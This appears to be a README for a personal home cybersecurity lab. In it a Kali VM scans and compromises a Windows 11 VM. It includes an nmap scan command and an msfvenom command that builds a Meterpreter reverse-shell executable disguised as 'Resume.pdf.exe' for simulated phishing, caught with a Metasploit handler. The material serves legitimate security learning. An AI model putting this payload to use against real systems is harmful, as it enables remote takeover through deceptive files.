# Home Cybersecurity Lab (Kali + Windows)

This is a local virtual cybersecurity lab built using Parallels on a Mac M2 machine. It demonstrates real-world attacker-defender scenarios in a controlled environment using Kali Linux and Windows 11.

---

## Lab Setup

- Kali Linux 2024.2 ARM64 (Parallels VM)
- Windows 11 VM
- Parallels Bridged Network (Default Adapter)
- Mac M2 Host Machine
- All traffic remains **within the local environment
- Internal IP addresses are partially masked (e.g., `192.168.20.xxx`)


## Tools Used

| Tool         | Role                                     |
|--------------|------------------------------------------|
| `nmap`       | Network discovery & port scanning        |
| `msfvenom`   | Payload generation                        |
| `msfconsole` | Exploitation and Meterpreter session     |
| `netstat`    | Viewing network connections on target    |
| `Splunk`     | Log analysis and monitoring (optional)   |

---

## Lab Activities

### 1. Network Discovery

Performed an aggressive Nmap scan from Kali to discover open ports and services on the Windows VM.

```bash
nmap -A 192.168.20.xxx
```

### 2. Payload Creation

Created a reverse shell payload using `msfvenom` to simulate phishing or social engineering attack:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.20.xxx LPORT=4444 -f exe -o Resume.pdf.exe
```

### 3. Exploitation with Metasploit

- Launched `msfconsole` on Kali
- Used `exploit/multi/handler` to receive the reverse shell
- Executed payload on Windows
- Gained a `meterpreter` session

### 4. Session Monitoring

Confirmed backdoor connection via:

```bash
netstat -ano
```

Monitored which processes were using the TCP ports.

---

##  Screenshots

> All IPs are partially masked (last octet hidden)

- Nmap scanning results
- Payload generation (msfvenom)
- Meterpreter session capture
- Netstat verification on Windows
- Ping test between Kali and Windows
- Network adapter settings in Parallels
- Splunk log activity (if used)

---

## Files

Screenshots are organized in the `/screenshots` folder, numbered by step.

---

## Notes

- This project was done on an isolated, local environment using only internal IPs.
- No real or public systems were targeted.
- For educational and ethical hacking purposes only.

---

## Future Improvements

- Automate log collection with Splunk
- Add IDS/IPS monitoring
- Simulate lateral movement or privilege escalation
- Expand to include Linux server or vulnerable VM (e.g., Metasploitable)

---

## Legal Disclaimer

This project is intended strictly for learning and simulation in a controlled lab setup. Do not replicate any part of this on networks or machines without explicit permission.
